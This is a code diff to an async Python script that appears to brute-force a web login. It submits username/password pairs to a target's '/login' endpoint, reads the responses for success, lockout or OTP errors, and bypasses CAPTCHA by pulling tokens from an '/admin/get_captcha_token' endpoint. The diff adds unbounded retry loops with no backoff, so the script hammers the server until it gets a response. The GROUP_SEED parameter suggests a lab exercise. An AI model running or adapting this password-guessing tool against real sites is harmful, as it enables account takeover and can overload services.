@@ -114,9 +114,11 @@ async def _consumer(session, queue, total_users, start, max_attempts, max_durati
 async def _attempt_login(session, queue, username, password):
     payload = {'username': username, 'password': password}
     await captcha_event.wait()
-    async with session.post(TARGET_URL + '/login', data=payload) as response:
-        html = await response.text()
-        return await _handle_html_response(session, queue, html, username, password)
+    while True:
+        async with session.post(TARGET_URL + '/login', data=payload) as response:
+            if response.status == 200:
+                html = await response.text()
+                return await _handle_html_response(session, queue, html, username, password)
     
 async def _handle_html_response(session, queue, html, username, password):
     soup = BeautifulSoup(html, 'html.parser')
@@ -132,17 +134,21 @@ async def _handle_html_response(session, queue, html, username, password):
         captcha_event.clear()
         token = await _get_captcha_token(session)
         payload = {'username': username, 'password': password, 'captcha': token}
-        async with session.post(TARGET_URL + '/login', data=payload) as response:
-            html = await response.text()
-            captcha_event.set()
-            return await _handle_html_response(session, queue, html, username, password)
+        while True:
+            async with session.post(TARGET_URL + '/login', data=payload) as response:
+                if response.status == 200:
+                    html = await response.text()
+                    captcha_event.set()
+                    return await _handle_html_response(session, queue, html, username, password)
     elif msg == "locked" or msg == "wrong OTP":
         return None
     return msg == "logged in"
 
 async def _get_captcha_token(session):
-    async with session.get(TARGET_URL + '/admin/get_captcha_token?group_seed=' + GROUP_SEED) as response:
-        html = await response.text()
-        soup = BeautifulSoup(html, 'html.parser')
-        token = soup.find(id="msg").get_text().strip()[7:]
-        return token if token != "not found" else None
+    while True:
+        async with session.get(TARGET_URL + '/admin/get_captcha_token?group_seed=' + GROUP_SEED) as response:
+            if response.status == 200:
+                html = await response.text()
+                soup = BeautifulSoup(html, 'html.parser')
+                token = soup.find(id="msg").get_text().strip()[7:]
+                return token if token != "not found" else None
